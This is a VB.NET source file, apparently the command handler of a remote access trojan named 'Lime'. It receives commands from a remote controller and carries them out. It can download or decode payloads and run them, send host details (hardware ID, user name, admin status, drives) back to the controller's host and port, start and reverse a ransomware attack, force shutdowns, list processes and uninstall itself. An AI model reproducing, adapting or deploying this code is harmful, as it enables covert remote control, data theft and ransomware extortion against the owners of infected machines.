Imports System.IO, System.Threading, System.Windows.Forms

Namespace Lime
    Public Class Commands
        Public Shared C As SK
        Public Shared Sub DT(ByVal B() As Byte)

            Dim A() As String = Split(C.GS(B), C.SPL)

            Try
                Select Case A(0)

                    Case "Close"
                        End
                    Case "Reconnect"
                        Application.Restart()
                        End
                    Case "Uni"
                        Insistence.DEL()
                   '###############################################################################
                    Case "RunDisk"
                        Try
                            Dim NewFile = Path.GetTempFileName & IO.Path.GetExtension(A(1))
                            File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                            Thread.CurrentThread.Sleep(1000)
                            Process.Start(NewFile)
                            If A(3).ToString = "update" Then
                                Insistence.DEL()
                            End If
                        Catch ex As Exception
                        End Try
                    Case "RunURL"
                        Try
                            Dim NewFile = Path.GetTempFileName & Path.GetExtension(A(1))
                            My.Computer.Network.DownloadFile(A(1), NewFile)
                            Thread.CurrentThread.Sleep(1000)
                            Process.Start(NewFile)
                            If A(2).ToString = "update" Then
                                Insistence.DEL()
                            End If
                        Catch ex As Exception
                            C.Send("MSG" & C.SPL & "[URL] " & ex.Message)
                        End Try
                   '###############################################################################
                    Case "Logoff"
                        Shell("shutdown -l -t 00 -f", AppWinStyle.Hide, False, -1)
                    Case "Restart"
                        Shell("shutdown -r -t 00 -f", AppWinStyle.Hide, False, -1)
                    Case "Shutdown"
                        Shell("shutdown -s -t 00 -f", AppWinStyle.Hide, False, -1)
                   '###############################################################################
                    Case "Details"
                        C.Send("Details" + C.SPL + ID.HWID + C.SPL + ID.UserName + C.SPL + Reflection.Assembly.GetExecutingAssembly.Location + C.SPL + ID.CPU + C.SPL + ID.GPU + C.SPL + ID.AmiAdmin + C.SPL + ID.MachineType + C.SPL + DateAndTime.Now + C.SPL + ID.ListDrivers + C.SPL + ID.LastReboot + C.SPL + Settings.LHOST + " @ " + Settings.LPORT.ToString)
                   '###############################################################################
                   '###############################################################################
                    Case "Ransom"
                        BeforeAttack(A(1), A(2))
                    Case "Ransom-DEC"
                        Dec(A(1))
                   '###############################################################################
                    Case "Processes"
                        Dim S As String = "Processes"
                        For Each x As Process In Process.GetProcesses
                            S &= C.SPL & x.ProcessName & "|LIME|" & x.Id
                        Next
                        C.Send(S)
                    Case "VisitURL"
                        Try
                            Process.Start(A(1))
                        Catch ex As Exception
                            C.Send("MSG" & C.SPL & "[VISIT] " & ex.Message)
                        End Try
                End Select
            Catch ex As Exception

            End Try


        End Sub
    End Class
End Namespace